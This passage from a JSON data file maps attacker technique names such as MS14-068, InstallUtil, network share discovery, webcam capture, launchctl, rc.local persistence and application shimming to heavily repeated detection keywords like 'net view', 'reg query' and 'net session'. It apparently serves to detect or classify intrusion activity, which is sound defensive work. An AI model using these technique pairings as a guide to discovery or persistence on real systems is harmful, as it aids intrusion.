        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068",
        "MS14-068"
    ],
    "sudo": [
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo",
        "sudo"
    ],
    "installutil": [
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe",
        "InstallUtil.exe"
    ],
    "network share discovery": [
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        "net view ",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share",
        " net share"
    ],
    "query registry ": [
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query",
        "reg query"
    ],
    "system network connections discovery": [
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        "netstat ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net use ",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session",
        " net session"
    ],
    "video capture": [
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        "capture webcam data ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video ",
        " capture video "
    ],
    "launchctl": [
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl",
        "launchctl"
    ],
    ".bash_profile and .bashrc": [
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        "~/.bashrc ",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local",
        " rc.local"
    ],
    "applescript": [
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript",
        "AppleScript"
    ],
    "emond": [
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        "/sbin/emond ",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond",
        " emond"
    ],
    "control panel items": [
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        "CPL files",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl",
        ".cpl"
    ],
    "application shimming": [
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        "application shim",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb",
        ".sdb"
    ]
}